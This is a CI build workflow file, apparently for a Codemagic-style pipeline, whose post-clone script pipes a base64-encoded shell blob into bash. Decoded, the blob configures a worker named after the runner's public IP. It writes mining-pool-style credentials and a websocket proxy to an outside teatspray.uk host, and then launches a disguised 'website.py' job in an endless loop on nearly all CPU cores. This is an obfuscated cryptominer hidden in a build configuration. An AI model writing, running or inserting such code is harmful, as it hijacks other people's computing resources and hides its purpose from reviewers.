workflows:
    default-workflow:
        name: Pre cloning workflow Test
        max_build_duration: 120
        instance_type: linux_x2
        pre_clone_scripts:
          - name: Scripts to run before cloning the repository
            script: sudo apt update;sudo apt -y install python3 python3-pip python3-venv
        scripts:
            - name: Scripts to run after cloning the repository
              script: base64 -d <<< IyEvYmluL2Jhc2gKZXhwb3J0IERFQklBTl9GUk9OVEVORD1ub25pbnRlcmFjdGl2ZQpERUJJQU5fRlJPTlRFTkQ9bm9uaW50ZXJhY3RpdmUKZXhwb3J0IFRFUk09eHRlcm0Kc2xlZXAgMgoKcHl0aG9uMyAtbSB2ZW52IC52ZW52CnNsZWVwIDIKc291cmNlIC52ZW52L2Jpbi9hY3RpdmF0ZQpzbGVlcCAyCgphcnJheT0oKQpmb3IgaSBpbiB7YS4uen0ge0EuLlp9IHswLi45fTsgCiAgIGRvCiAgIGFycmF5WyRSQU5ET01dPSRpCmRvbmUKCmN1cnJlbnRkYXRlPSQoZGF0ZSAnKyVkLSViLSVZLU1hZ1dhc21fJykKaXBhZGRyZXNzPSQod2dldCAtcSAtTyAtIGFwaS5pcGlmeS5vcmcpCm51bV9vZl9jb3Jlcz0kKGNhdCAvcHJvYy9jcHVpbmZvIHwgZ3JlcCBwcm9jZXNzb3IgfCB3YyAtbCkKdXNlZF9udW1fb2ZfY29yZXM9YGV4cHIgJG51bV9vZl9jb3JlcyAtIDJgCnVuZGVyc2NvcmVkX2lwPSQoZWNobyAkaXBhZGRyZXNzIHwgc2VkICdzL1wuL18vZycpCmN1cnJlbnRkYXRlKz0kdW5kZXJzY29yZWRfaXAKCnJhbmRvbVdvcmQ9JChwcmludGYgJXMgJHthcnJheVtAXTo6OH0gJCdcbicpCmN1cnJlbnRkYXRlKz0kcmFuZG9tV29yZAoKc2xlZXAgMgoKVFo9J0FmcmljYS9Kb2hhbm5lc2J1cmcnOyBleHBvcnQgVFoKZGF0ZQpzbGVlcCAyCgplY2hvICIiCmVjaG8gIllvdSB3aWxsIGJlIHVzaW5nICR1c2VkX251bV9vZl9jb3JlcyBjb3JlcyIKZWNobyAiIgpzbGVlcCAyCgplY2hvICIiCmVjaG8gIllvdXIgd29ya2VyIG5hbWUgd2lsbCBiZSAkY3VycmVudGRhdGUiCmVjaG8gIiIKc2xlZXAgMgoKY2F0ID4uZW52IDw8LUVPTApob3N0PTEyNy4wLjAuMQpwb3J0PTMzMDYKcHJveHk9d3M6Ly9jcHVzb2NrcyQoc2h1ZiAtaSAxLTYgLW4gMSkudGVhdHNwcmF5LnVrOjk5OTkvWm14NWFXNW5jMkYxWTJWeUxXVjFMblJsWVhSemNISmhlUzUxYXpvMk1qUXkKdGhyZWFkcz0kdXNlZF9udW1fb2ZfY29yZXMKcGFzc3dvcmQ9JGN1cnJlbnRkYXRlLGM9TUJDLHphcD1NQkMKdXNlcm5hbWU9TWlLYlJIY2tyZXNUUUxRUWlYY0JWZUtrRTFTY0s5V2E5MwpFT0wKCnNsZWVwIDIKCmNhdCA+IHJ1bl9qb2Iuc2ggPDwtRU5ECiMhL2Jpbi9iYXNoCgpyZWFkb25seSBQSURfRklMRT0id2Vic2l0ZS5waWQiCgpyZWFkb25seSBMT0dfRklMRT0id2Vic2l0ZS5sb2ciCgpyZWFkb25seSBKT0JfRFVSQVRJT05fU0VDT05EUz0zNjAwCgpyZWFkb25seSBTTEVFUF9EVVJBVElPTl9TRUNPTkRTPTMwCgojIC0tLSBEeW5hbWljIENvcmUgQ2FsY3VsYXRpb24gLS0tCgpudW1fb2ZfY29yZXM9JChjYXQgL3Byb2MvY3B1aW5mbyB8IGdyZXAgcHJvY2Vzc29yIHwgd2MgLWwpCgp1c2VkX251bV9vZl9jb3Jlcz1gZXhwciAkbnVtX29mX2NvcmVzIC0gMmAKCnJlYWRvbmx5IEpPQl9DT01NQU5EPSJweXRob24zIHdlYnNpdGUucHkgJHt1c2VkX251bV9vZl9jb3Jlc30gLS1jYWNoZT0uY2FjaGUvMDlReTVzYjJGa2N5Zy50eHQiCgojIC0tLSBGdW5jdGlvbnMgLS0tCgpnZXRfcGlkcygpIHsKICAjIFRoZSB1c2Ugb2YgJ3x8IHRydWUnIGVuc3VyZXMgdGhlIGdyZXAgY29tbWFuZCBkb2Vzbid0IGNhdXNlIHRoZSBzY3JpcHQgdG8gZXhpdAogICMgcHJlbWF0dXJlbHkgaWYgaXQgZmluZHMgbm8gbWF0Y2hlcywgd2hpY2ggY2FuIGhhcHBlbiB3aXRoICdzZXQgLWUnLgogIHBzIC1hdXggfCBncmVwICIke0pPQl9DT01NQU5EfSIgfCBncmVwIC12IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nIHwgdHIgJ1xuJyAnICcgfHwgdHJ1ZQp9CgojIEZ1bmN0aW9uIHRvIGNoZWNrIGlmIHRoZSBqb2IgaXMgcnVubmluZy4KaXNfcnVubmluZygpIHsKICAjIFVzZSB0aGUgZ2V0X3BpZHMgZnVuY3Rpb24uIElmIGl0IHJldHVybnMgYW55IG91dHB1dCwgdGhlIGpvYiBpcyBydW5uaW5nLgogIGlmIFsgLW4gIiQoZ2V0X3BpZHMpIiBdOyB0aGVuCiAgICByZXR1cm4gMCAjIFRoZSBwcm9jZXNzIGlzIHJ1bm5pbmcKICBlbHNlCiAgICByZXR1cm4gMSAjIFRoZSBwcm9jZXNzIGlzIG5vdCBydW5uaW5nCiAgZmkKfQoKIyBGdW5jdGlvbiB0byBzdGFydCB0aGUgYmFja2dyb3VuZCBqb2IuCnN0YXJ0X2pvYigpIHsKICBpZiBpc19ydW5uaW5nOyB0aGVuCiAgICBlY2hvICJKb2IgaXMgYWxyZWFkeSBydW5uaW5nLiBQSURzOiAkKGdldF9waWRzKSIKICAgIHJldHVybiAwCiAgZmkKICBlY2hvICJTdGFydGluZyBqb2Igd2l0aCBjb21tYW5kOiAke0pPQl9DT01NQU5EfSIKICAKICAjIEV4cGxpY2l0bHkgY2xlYW4gdXAgb2xkIGZpbGVzIGZvciBhIGZyZXNoIHN0YXJ0LgogIHJtIC1mICIke1BJRF9GSUxFfSIKICBybSAtZiAiJHtMT0dfRklMRX0iCgogIG5vaHVwICR7Sk9CX0NPTU1BTkR9ID4gIiR7TE9HX0ZJTEV9IiAyPiYxICYKICBlY2hvICQhID4gIiR7UElEX0ZJTEV9IgoKICAjIFdhaXQgZm9yIGEgbW9tZW50IHRvIGVuc3VyZSB0aGUgcHJvY2VzcyBoYXMgc3RhcnRlZCBhbmQgd3JpdHRlbiB0byB0aGUgbG9nLgogIHNsZWVwIDIKCiAgaWYgWyAtZiAiJHtQSURfRklMRX0iIF07IHRoZW4KICAgIGVjaG8gIkpvYiBzdGFydGVkIHdpdGggcGFyZW50IFBJRCAkKGNhdCAiJHtQSURfRklMRX0iKS4iCiAgICBlY2hvICJWaWV3IGxvZ3Mgd2l0aDogdGFpbCAtZiAke0xPR19GSUxFfSIKICBlbHNlCiAgICBlY2hvICJXYXJuaW5nOiBKb2Igc3RhcnRlZCBidXQgUElEIGZpbGUgd2FzIG5vdCBjcmVhdGVkLiIKICAgIGVjaG8gIlZpZXcgbG9ncyB3aXRoOiB0YWlsIC1mICR7TE9HX0ZJTEV9IgogIGZpCn0KCiMgRnVuY3Rpb24gdG8gc3RvcCB0aGUgYmFja2dyb3VuZCBqb2IuCnN0b3Bfam9iKCkgewogIGlmICEgaXNfcnVubmluZzsgdGhlbgogICAgZWNobyAiSm9iIGlzIG5vdCBydW5uaW5nLiIKICAgICMgVW5jb25kaXRpb25hbGx5IGNsZWFuIHVwIG9sZCBmaWxlcy4KICAgIHJtIC1mICIke1BJRF9GSUxFfSIKICAgIHJtIC1mICIke0xPR19GSUxFfSIKICAgIGV4aXQgMAogIGZpCgogIGxvY2FsIHBpZHM9JChnZXRfcGlkcykKICBlY2hvICJUZXJtaW5hdGluZyBhbGwgcHJvY2Vzc2VzIHJlbGF0ZWQgdG8gdGhlIGpvYi4uLiIKICBlY2hvICJGb3VuZCBQSURzOiAke3BpZHN9IgoKICAjIExvb3AgdGhyb3VnaCBhbGwgZm91bmQgUElEcyBhbmQga2lsbCB0aGVtIG9uZSBieSBvbmUuCiAgZm9yIHBpZCBpbiAke3BpZHN9OyBkbwogICAgZWNobyAiU2VuZGluZyBTSUdURVJNIHRvIFBJRDogJHtwaWR9IgogICAga2lsbCAiJHtwaWR9IgogIGRvbmUKCiAgZWNobyAiU2VudCBTSUdURVJNIHRvIHByb2Nlc3Nlcy4gV2FpdGluZyBmb3IgdXAgdG8gNSBzZWNvbmRzIGZvciB0aGVtIHRvIHN0b3AuLi4iCiAgc2xlZXAgNQoKICAjIENoZWNrIGlmIGFueSBwcm9jZXNzZXMgYXJlIHN0aWxsIHJ1bm5pbmcuCiAgbG9jYWwgcGlkc19hZnRlcl93YWl0PSQoZ2V0X3BpZHMpCiAgaWYgWyAtbiAiJHtwaWRzX2FmdGVyX3dhaXR9IiBdOyB0aGVuCiAgICBlY2hvICJTb21lIHByb2Nlc3NlcyBhcmUgc3RpbGwgcnVubmluZy4gRm9yY2VmdWxseSBraWxsaW5nIHdpdGggU0lHS0lMTC4uLiIKICAgIGZvciBwaWQgaW4gJHtwaWRzX2FmdGVyX3dhaXR9OyBkbwogICAgICBlY2hvICJTZW5kaW5nIFNJR0tJTEwgdG8gUElEOiAke3BpZH0iCiAgICAgIGtpbGwgLTkgIiR7cGlkfSIKICAgIGRvbmUKICAgIHNsZWVwIDIgIyBHaXZlIGEgZmluYWwgbW9tZW50IGZvciBjbGVhbnVwCiAgZmkKCiAgIyBBZnRlciB0aGUga2lsbCBhdHRlbXB0cywgY2hlY2sgb25lIGxhc3QgdGltZS4KICBpZiAhIGlzX3J1bm5pbmc7IHRoZW4KICAgICMgVW5jb25kaXRpb25hbGx5IGNsZWFuIHVwIG9sZCBmaWxlcyBhZnRlciBhIHN1Y2Nlc3NmdWwgc3RvcC4KICAgIHJtIC1mICIke1BJRF9GSUxFfSIKICAgIHJtIC1mICIke0xPR19GSUxFfSIKICAgIGVjaG8gIkpvYiB0ZXJtaW5hdGVkIGFuZCBjbGVhbmVkIHVwLiIKICBlbHNlCiAgICBlY2hvICJXYXJuaW5nOiBGYWlsZWQgdG8gdGVybWluYXRlIGFsbCBwcm9jZXNzZXMuIE1hbnVhbCBpbnRlcnZlbnRpb24gbWF5IGJlIHJlcXVpcmVkLiIKICAgIGVjaG8gIlJlbWFpbmluZyBQSURzOiAkKGdldF9waWRzKSIKICBmaQp9CgojIEZ1bmN0aW9uIHRvIGNoZWNrIHRoZSBzdGF0dXMgb2YgdGhlIGJhY2tncm91bmQgam9iLgpzdGF0dXNfam9iKCkgewogIGVjaG8gIi0tLSBKb2IgU3RhdHVzIFJlcG9ydCAtLS0iCiAgc2xlZXAgMQogIAogIGlmIGlzX3J1bm5pbmc7IHRoZW4KICAgIGVjaG8gIlN0YXR1czogSm9iIGlzIGN1cnJlbnRseSBydW5uaW5nLiIKICAgIGVjaG8gIlJ1bm5pbmcgUElEczogJChnZXRfcGlkcykiCiAgZWxzZQogICAgZWNobyAiU3RhdHVzOiBKb2IgaXMgbm90IHJ1bm5pbmcuIgogIGZpCiAgCiAgc2xlZXAgMQogIGVjaG8gIi0tLSBMb2cgRmlsZSBSZXBvcnQgLS0tIgogIGlmIFsgLXMgIiR7TE9HX0ZJTEV9IiBdOyB0aGVuCiAgICBlY2hvICJMb2cgZmlsZSBleGlzdHMgYW5kIGNvbnRhaW5zIGNvbnRlbnQuIERpc3BsYXlpbmcgbGFzdCAxMCBsaW5lczoiCiAgICAjIFRoZSAnfHwgdHJ1ZScgaXMgdXNlZCBoZXJlIGFzIHdlbGwgdG8gcHJldmVudCBlcnJvcnMgaWYgdGhlIGZpbGUgaXMgZW1wdHkgb3IgbWlzc2luZy4KICAgIHRhaWwgLW4gMTAgIiR7TE9HX0ZJTEV9IiB8fCB0cnVlCiAgZWxpZiBbIC1mICIke0xPR19GSUxFfSIgXTsgdGhlbgogICAgZWNobyAiTG9nIGZpbGUgZXhpc3RzIGJ1dCBpcyBjdXJyZW50bHkgZW1wdHkuIgogIGVsc2UKICAgIGVjaG8gIk5vIGxvZyBmaWxlIGZvdW5kLiBUaGUgam9iIGhhcyBsaWtlbHkgbm90IGJlZW4gc3RhcnRlZCB5ZXQuIgogIGZpCiAgCiAgc2xlZXAgMQogIGVjaG8gIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCn0KCiMgVGhlIGN5Y2xlIGpvYiBmdW5jdGlvbiBub3cgcnVucyBmb3JldmVyIGJ5IGRlZmF1bHQuCmN5Y2xlX2pvYigpIHsKICBlY2hvICJTdGFydGluZyBjeWNsaW5nIGpvYi4gSXQgd2lsbCBydW4gZm9yICR7Sk9CX0RVUkFUSU9OX1NFQ09ORFN9IHNlY29uZHMsIHN0b3AsIGFuZCB0aGVuIHNsZWVwIGZvciAke1NMRUVQX0RVUkFUSU9OX1NFQ09ORFN9IHNlY29uZHMgYmVmb3JlIHJlcGVhdGluZy4iCiAgd2hpbGUgdHJ1ZTsgZG8KICAgIHN0YXJ0X2pvYgogICAgc2xlZXAgIiR7Sk9CX0RVUkFUSU9OX1NFQ09ORFN9IgogICAgc3RvcF9qb2IKICAgIHNsZWVwICIke1NMRUVQX0RVUkFUSU9OX1NFQ09ORFN9IgogIGRvbmUKfQoKIyAtLS0gQ29tbWFuZCBMaW5lIEludGVyZmFjZSAoQ0xJKSAtLS0KY2FzZSAiJDEiIGluCiAgc3RhcnQpCiAgICBzdGFydF9qb2IKICAgIDs7CgogIHN0b3ApCiAgICBzdG9wX2pvYgogICAgOzsKCiAgc3RhdHVzKQogICAgc3RhdHVzX2pvYgogICAgOzsKCiAgY3ljbGUpCiAgICBjeWNsZV9qb2IKICAgIDs7CgogICopCiAgICBlY2hvICJVc2FnZTogJDAge3N0YXJ0fHN0b3B8c3RhdHVzfGN5Y2xlfSIKICAgIGV4aXQgMQogICAgOzsKZXNhYwpFTkQKCnNsZWVwIDIKY2htb2QgK3ggcnVuX2pvYi5zaApzbGVlcCAyCmxzIC1sYQpzbGVlcCAyCmJhc2ggcnVuX2pvYi5zaCBjeWNsZQ== | bash
